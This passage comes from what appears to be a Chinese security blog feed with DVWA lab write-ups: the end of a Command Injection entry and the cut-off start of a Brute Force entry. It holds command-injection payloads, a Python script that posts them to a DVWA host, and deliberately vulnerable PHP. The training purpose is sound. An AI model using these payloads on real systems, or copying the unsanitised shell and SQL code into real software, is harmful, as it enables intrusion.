class="token variable">$target</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// *nix</span>        <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span> <span class="token string">'ping  -c 4 '</span> <span class="token punctuation">.</span> <span class="token variable">$target</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// Feedback for the end user</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;pre>{$cmd}&lt;/pre>"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span> </code></pre><ul><li>源码中对大部分关键符号都进行了过滤，但是过滤<code>|</code>时过滤的是:<code>&#39;| &#39;</code></li></ul><p><strong>漏洞利用：</strong></p><p><strong>方式一：文本框注入测试</strong></p><ul><li><p>使用FireFox浏览器访问DVWA站点，登录成功后选择<code>Command Injection</code>模块，在文本框中分别提交以下数据：</p><ul><li><code>127.0.0.1&amp;;&amp;id</code></li><li><code>127.0.0.1&amp;;&amp;net user</code></li><li><code>testcmdinjection||id</code></li><li><code>testcmdinjection||net user</code></li><li><code>127.0.0.1&amp;id</code></li><li><code>127.0.0.1|id</code></li><li><code>127.0.0.1&amp;net user</code></li><li><code>testcmdinjection|id</code></li><li><code>testcmdinjection|net user</code></li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/CommandInjection/IP-id-high-result.png" alt="IP-id-high-result"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/CommandInjection/testcmd-etuser-high-result.png" alt="testcmd-etuser-high-result"></center></li><li><p>命令注入漏洞的判断主要是在提交包含注入命令数据后根据回显结果是否包含执行命令记过特征进行判断。</p></li></ul><p><strong>方法二：自编写POC</strong></p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># Version: python3</span><span class="token comment" spellcheck="true"># Author: Silence</span><span class="token comment" spellcheck="true"># Encoding: utf-8</span><span class="token keyword">import</span> re<span class="token keyword">from</span> concurrent<span class="token punctuation">.</span>futures<span class="token punctuation">.</span>thread <span class="token keyword">import</span> ThreadPoolExecutor<span class="token keyword">import</span> itertools<span class="token keyword">import</span> requestsWORKERS <span class="token operator">=</span> <span class="token number">10</span><span class="token keyword">def</span> <span class="token function">injection</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    addr<span class="token punctuation">,</span>headers<span class="token punctuation">,</span>payload <span class="token operator">=</span> data    url <span class="token operator">=</span> <span class="token string">'http://{0}:{1}/dvwa/vulnerabilities/exec/'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span><span class="token operator">*</span>addr<span class="token punctuation">)</span>    name <span class="token operator">=</span> payload<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span>    pattern <span class="token operator">=</span> payload<span class="token punctuation">[</span><span class="token string">'pattern'</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> pld <span class="token keyword">in</span> payload<span class="token punctuation">[</span><span class="token string">'payloads'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        params <span class="token operator">=</span> <span class="token punctuation">{</span>            <span class="token string">'ip'</span> <span class="token punctuation">:</span> pld<span class="token punctuation">,</span>            <span class="token string">'Submit'</span> <span class="token punctuation">:</span> <span class="token string">'Submit'</span>        <span class="token punctuation">}</span>        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>params<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>        <span class="token keyword">if</span> response<span class="token punctuation">.</span>ok <span class="token operator">and</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span>response<span class="token punctuation">.</span>text<span class="token punctuation">,</span>re<span class="token punctuation">.</span>I<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">True</span><span class="token punctuation">,</span>name<span class="token punctuation">,</span>pld    <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token punctuation">,</span>name<span class="token punctuation">,</span>None<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span>headers<span class="token punctuation">)</span><span class="token punctuation">:</span>    payloads <span class="token operator">=</span> <span class="token punctuation">[</span>            <span class="token punctuation">{</span>                <span class="token string">'name'</span><span class="token punctuation">:</span><span class="token string">'id'</span><span class="token punctuation">,</span>                <span class="token string">'pattern'</span><span class="token punctuation">:</span>r<span class="token string">'uid=\d'</span><span class="token punctuation">,</span>                <span class="token string">'payloads'</span><span class="token punctuation">:</span><span class="token punctuation">[</span>                <span class="token string">'127.0.0.1;id;'</span><span class="token punctuation">,</span>                <span class="token string">'127.0.0.1&amp;;&amp;id'</span><span class="token punctuation">,</span>                <span class="token string">'127.0.0.1&amp;id'</span><span class="token punctuation">,</span>                <span class="token string">'127.0.0.1|id'</span><span class="token punctuation">,</span>                <span class="token string">'127.0.0.1||id'</span><span class="token punctuation">,</span>                <span class="token string">'testcmdinjection&amp;id'</span><span class="token punctuation">,</span>                <span class="token string">'testcmdinjection|id'</span><span class="token punctuation">,</span>                <span class="token string">'testcmdinjection||id'</span><span class="token punctuation">,</span>            <span class="token punctuation">]</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span>        <span class="token punctuation">{</span>            <span class="token string">'name'</span><span class="token punctuation">:</span><span class="token string">'net user'</span><span class="token punctuation">,</span>            <span class="token string">'pattern'</span><span class="token punctuation">:</span>r<span class="token string">'Administrator'</span><span class="token punctuation">,</span>            <span class="token string">'payloads'</span><span class="token punctuation">:</span><span class="token punctuation">[</span>                <span class="token string">'127.0.0.1&amp;;&amp;net user'</span><span class="token punctuation">,</span>                <span class="token string">'127.0.0.1&amp;net user'</span><span class="token punctuation">,</span>                <span class="token string">'127.0.0.1|net user'</span><span class="token punctuation">,</span>                <span class="token string">'testcmdinjection&amp;net user'</span><span class="token punctuation">,</span>                <span class="token string">'testcmdinjection|net user'</span><span class="token punctuation">,</span>                <span class="token string">'testcmdinjection||net user'</span><span class="token punctuation">,</span>            <span class="token punctuation">]</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">]</span>    datas <span class="token operator">=</span> itertools<span class="token punctuation">.</span>product<span class="token punctuation">(</span><span class="token punctuation">[</span>addr<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span>headers<span class="token punctuation">]</span><span class="token punctuation">,</span>payloads<span class="token punctuation">)</span>    executor <span class="token operator">=</span> ThreadPoolExecutor<span class="token punctuation">(</span>max_workers<span class="token operator">=</span>WORKERS<span class="token punctuation">)</span>    <span class="token keyword">for</span> success<span class="token punctuation">,</span>name<span class="token punctuation">,</span>payload <span class="token keyword">in</span> executor<span class="token punctuation">.</span>map<span class="token punctuation">(</span>injection<span class="token punctuation">,</span>datas<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> success<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'+ name:'</span><span class="token punctuation">,</span>name<span class="token punctuation">,</span><span class="token string">',payload:'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    server <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'124.70.137.227'</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token punctuation">)</span>    headers <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">'Cookie'</span> <span class="token punctuation">:</span> <span class="token string">'security=high; PHPSESSID=gqhrhpesfenrmv2veseur4orb6'</span>    <span class="token punctuation">}</span>    main<span class="token punctuation">(</span>server<span class="token punctuation">,</span>headers<span class="token punctuation">)</span></code></pre><p>使用：</p><ul><li>从浏览器中 copy 登陆成功后的 cookie 信息</li><li>使用 python3 运行脚本</li></ul><p>说明：</p><ul><li>使用线程池机制同时发起多个请求</li><li>使用 requests 发送请求到 dvwa，在提交时使用具有注入命令的参数，通过注入命令执行结果特征码进行识别是否具有漏洞  </li></ul><h2 id="Impossible级别"><a href="#Impossible级别" class="headerlink" title="Impossible级别"></a>Impossible级别</h2><p>​        设置 DVWA 安全级别为 Impossible。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/SecurityLevel_Impossible.png" alt="SecurityLevel_Impossible"></center><p><strong>服务器端核心代码</strong>：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">isset</span><span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string">'Submit'</span> <span class="token punctuation">]</span>  <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// Check Anti-CSRF token</span>    <span class="token function">checkToken</span><span class="token punctuation">(</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span> <span class="token string">'user_token'</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span> <span class="token string">'session_token'</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'index.php'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Get input</span>    <span class="token variable">$target</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span> <span class="token string">'ip'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$target</span> <span class="token operator">=</span> <span class="token function">stripslashes</span><span class="token punctuation">(</span> <span class="token variable">$target</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Split the IP into 4 octects</span>    <span class="token variable">$octet</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span> <span class="token string">"."</span><span class="token punctuation">,</span> <span class="token variable">$target</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Check IF each octet is an integer</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token punctuation">(</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span> <span class="token variable">$octet</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span> <span class="token variable">$octet</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span> <span class="token variable">$octet</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span> <span class="token variable">$octet</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span> <span class="token function">sizeof</span><span class="token punctuation">(</span> <span class="token variable">$octet</span> <span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">4</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// If all 4 octets are int's put the IP back together.</span>        <span class="token variable">$target</span> <span class="token operator">=</span> <span class="token variable">$octet</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">'.'</span> <span class="token punctuation">.</span> <span class="token variable">$octet</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">'.'</span> <span class="token punctuation">.</span> <span class="token variable">$octet</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">'.'</span> <span class="token punctuation">.</span> <span class="token variable">$octet</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// Determine OS and execute the ping command.</span>        <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">stristr</span><span class="token punctuation">(</span> <span class="token function">php_uname</span><span class="token punctuation">(</span> <span class="token string">'s'</span> <span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'Windows NT'</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// Windows</span>            <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span> <span class="token string">'ping  '</span> <span class="token punctuation">.</span> <span class="token variable">$target</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// *nix</span>            <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span> <span class="token string">'ping  -c 4 '</span> <span class="token punctuation">.</span> <span class="token variable">$target</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// Feedback for the end user</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;pre>{$cmd}&lt;/pre>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// Ops. Let the user name theres a mistake</span>        <span class="token keyword">echo</span> <span class="token string">'&lt;pre>ERROR: You have entered an invalid IP.&lt;/pre>'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// Generate Anti-CSRF token</span><span class="token function">generateSessionToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span> </code></pre><ul><li>在后端对IP地址的格式进行验证，无法注入其他命令。</li></ul><h1 id="0x04-修复建议"><a href="#0x04-修复建议" class="headerlink" title="0x04 修复建议"></a>0x04 修复建议</h1><ul><li>使用白名单对提交数据类型和格式进行严格验证</li><li>限制执行命令由用户提交，使用白名单限制执行命令</li><li>避免 web 服务器启动用户权限过高  </li></ul><h1 id="0x05-参考资料"><a href="#0x05-参考资料" class="headerlink" title="0x05 参考资料"></a>0x05 参考资料</h1><ul><li>《DVWA 漏洞测试平台分析》，红日安全工具研发组长-Silence</li></ul>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
          <category> 靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DVWA </tag>
            
            <tag> 命令执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA-BruteForce</title>
      <link href="/2020/09/12/dvwa-bruteforce/"/>
      <url>/2020/09/12/dvwa-bruteforce/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01 漏洞概述"></a>0x01 漏洞概述</h1><p>​        Brute Force即暴力（破解），是指黑客利用密码字典，使用穷举法猜解出用户口令，是现在最为广泛使用的攻击手法之一，如2014年轰动全国的12306“撞库”事件，实质就是暴力破解攻击。</p><p><strong>Brute Force模块分析</strong></p><p>​        模仿用户登录界面：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/BruteForce.png" alt="BruteForce"></center><p>​        <strong>已授权用户登录</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/BruteForce_SuccessfulLogin.png" alt="BruteForce_SuccessfulLogin"></center><p>​        <strong>未授权用户登录</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/BruteForce_FailedLogin.png" alt="BruteForce_FailedLogin"></center><p>​        BruteForce模块的index.php代码：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">define</span><span class="token punctuation">(</span> <span class="token string">'DVWA_WEB_PAGE_TO_ROOT'</span><span class="token punctuation">,</span> <span class="token string">'../../'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">require_once</span> <span class="token constant">DVWA_WEB_PAGE_TO_ROOT</span> <span class="token punctuation">.</span> <span class="token string">'dvwa/includes/dvwaPage.inc.php'</span><span class="token punctuation">;</span><span class="token function">dvwaPageStartup</span><span class="token punctuation">(</span> <span class="token keyword">array</span><span class="token punctuation">(</span> <span class="token string">'authenticated'</span><span class="token punctuation">,</span> <span class="token string">'phpids'</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$page</span> <span class="token operator">=</span> <span class="token function">dvwaPageNewGrab</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$page</span><span class="token punctuation">[</span> <span class="token string">'title'</span> <span class="token punctuation">]</span>   <span class="token operator">=</span> <span class="token string">'Vulnerability: Brute Force'</span> <span class="token punctuation">.</span> <span class="token variable">$page</span><span class="token punctuation">[</span> <span class="token string">'title_separator'</span> <span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$page</span><span class="token punctuation">[</span> <span class="token string">'title'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$page</span><span class="token punctuation">[</span> <span class="token string">'page_id'</span> <span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'brute'</span><span class="token punctuation">;</span><span class="token variable">$page</span><span class="token punctuation">[</span> <span class="token string">'help_button'</span> <span class="token punctuation">]</span>   <span class="token operator">=</span> <span class="token string">'brute'</span><span class="token punctuation">;</span><span class="token variable">$page</span><span class="token punctuation">[</span> <span class="token string">'source_button'</span> <span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'brute'</span><span class="token punctuation">;</span><span class="token function">dvwaDatabaseConnect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$method</span>            <span class="token operator">=</span> <span class="token string">'GET'</span><span class="token punctuation">;</span><span class="token variable">$vulnerabilityFile</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span><span class="token keyword">switch</span><span class="token punctuation">(</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span> <span class="token string">'security'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">case</span> <span class="token string">'low'</span><span class="token punctuation">:</span>        <span class="token variable">$vulnerabilityFile</span> <span class="token operator">=</span> <span class="token string">'low.php'</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> <span class="token string">'medium'</span><span class="token punctuation">:</span>        <span class="token variable">$vulnerabilityFile</span> <span class="token operator">=</span> <span class="token string">'medium.php'</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> <span class="token string">'high'</span><span class="token punctuation">:</span>        <span class="token variable">$vulnerabilityFile</span> <span class="token operator">=</span> <span class="token string">'high.php'</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">default</span><span class="token punctuation">:</span>        <span class="token variable">$vulnerabilityFile</span> <span class="token operator">=</span> <span class="token string">'impossible.php'</span><span class="token punctuation">;</span>        <span class="token variable">$method</span> <span class="token operator">=</span> <span class="token string">'POST'</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">require_once</span> <span class="token constant">DVWA_WEB_PAGE_TO_ROOT</span> <span class="token punctuation">.</span> <span class="token string">"vulnerabilities/brute/source/{$vulnerabilityFile}"</span><span class="token punctuation">;</span><span class="token variable">$page</span><span class="token punctuation">[</span> <span class="token string">'body'</span> <span class="token punctuation">]</span> <span class="token punctuation">.</span><span class="token operator">=</span> "<span class="token markup">&lt;div class=\"body_padded\"></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span></span>Vulnerability<span class="token punctuation">:</span> Brute Force<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></span>    <span class="token markup">&lt;div class=\"vulnerable_code_area\"></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span></span>Login<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span></span>        <span class="token markup">&lt;form action=\"#\" method=\"{$method}\"></span>            Username<span class="token punctuation">:</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span></span>            <span class="token markup">&lt;input type=\"text\" name=\"username\"></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span></span>            Password<span class="token punctuation">:</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span></span>            <span class="token markup">&lt;input type=\"password\" AUTOCOMPLETE=\"off\" name=\"password\"></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span></span>            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span></span>            <span class="token markup">&lt;input type=\"submit\" value=\"Login\" name=\"Login\"></span>\<span class="token package">n</span>"<span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$vulnerabilityFile</span> <span class="token operator">==</span> <span class="token string">'high.php'</span> <span class="token operator">||</span> <span class="token variable">$vulnerabilityFile</span> <span class="token operator">==</span> <span class="token string">'impossible.php'</span> <span class="token punctuation">)</span>    <span class="token variable">$page</span><span class="token punctuation">[</span> <span class="token string">'body'</span> <span class="token punctuation">]</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">"            "</span> <span class="token punctuation">.</span> <span class="token function">tokenField</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$page</span><span class="token punctuation">[</span> <span class="token string">'body'</span> <span class="token punctuation">]</span> <span class="token punctuation">.</span><span class="token operator">=</span> "        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span>        <span class="token punctuation">{</span><span class="token variable">$html</span><span class="token punctuation">}</span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span></span>More Information<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span></span>" <span class="token punctuation">.</span> <span class="token function">dvwaExternalLinkUrlGet</span><span class="token punctuation">(</span> 'https<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//www.owasp.org/index.php/Testing_for_Brute_Force_(OWASP-AT-004)' ) . "&lt;/li></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span></span>" <span class="token punctuation">.</span> <span class="token function">dvwaExternalLinkUrlGet</span><span class="token punctuation">(</span> 'http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//www.symantec.com/connect/articles/password-crackers-ensuring-security-your-password' ) . "&lt;/li></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span></span>" <span class="token punctuation">.</span> <span class="token function">dvwaExternalLinkUrlGet</span><span class="token punctuation">(</span> 'http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//www.sillychicken.co.nz/Security/how-to-brute-force-http-forms-in-windows.html' ) . "&lt;/li></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>\<span class="token package">n</span>"<span class="token punctuation">;</span><span class="token function">dvwaHtmlEcho</span><span class="token punctuation">(</span> <span class="token variable">$page</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>​        可以看到，只有Impossible级别使用了<code>POST</code>提交方式，其他三种级别均是以<code>GET</code>方式进行提交的。</p><h1 id="0x02-测试工具"><a href="#0x02-测试工具" class="headerlink" title="0x02 测试工具"></a>0x02 测试工具</h1><ul><li>Firefox</li><li>Burp Suite</li></ul><h1 id="0x03-漏洞测试"><a href="#0x03-漏洞测试" class="headerlink" title="0x03 漏洞测试"></a>0x03 漏洞测试</h1><h2 id="Low级别"><a href="#Low级别" class="headerlink" title="Low级别"></a>Low级别</h2><p>​        设置 DVWA 安全级别为 LOW 。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/SecurityLevel_Low.png" alt="SecurityLevel_Low"></center><p><strong>服务器端核心代码</strong>：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">isset</span><span class="token punctuation">(</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string">'Login'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// Get username</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string">'username'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Get password</span>    <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string">'password'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span> <span class="token variable">$pass</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Check the database</span>    <span class="token variable">$query</span>  <span class="token operator">=</span> <span class="token string">"SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';"</span><span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$query</span> <span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span> <span class="token string">'&lt;pre>'</span> <span class="token punctuation">.</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$___mysqli_res</span> <span class="token operator">=</span> <span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$___mysqli_res</span> <span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'&lt;/pre>'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$result</span> <span class="token operator">&amp;&amp;</span> <span class="token function">mysqli_num_rows</span><span class="token punctuation">(</span> <span class="token variable">$result</span> <span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// Get users details</span>        <span class="token variable">$row</span>    <span class="token operator">=</span> <span class="token function">mysqli_fetch_assoc</span><span class="token punctuation">(</span> <span class="token variable">$result</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$avatar</span> <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">"avatar"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// Login successful</span>        <span class="token keyword">echo</span> <span 